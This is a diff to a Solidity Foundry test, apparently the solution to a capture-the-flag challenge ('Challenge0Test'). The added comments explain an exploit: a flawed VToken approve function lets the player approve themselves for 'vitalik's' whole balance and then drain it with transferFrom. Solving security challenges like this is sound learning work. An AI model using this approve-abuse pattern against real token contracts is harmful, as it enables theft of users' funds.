@@ -30,9 +30,13 @@ contract Challenge0Test is Test {
 
         //============================//
 
+        // Get balance of vitalik
         uint balance = VToken(token).balanceOf(vitalik);
 
+        // The approve function of the VToken allows anyone to approve anything
+        // So we can call approve for vitalik's tokens
         VToken(token).approve(vitalik, player, balance);
+        // Then we transfer his tokens to us
         IERC20(token).transferFrom(vitalik, player, balance);
 
 
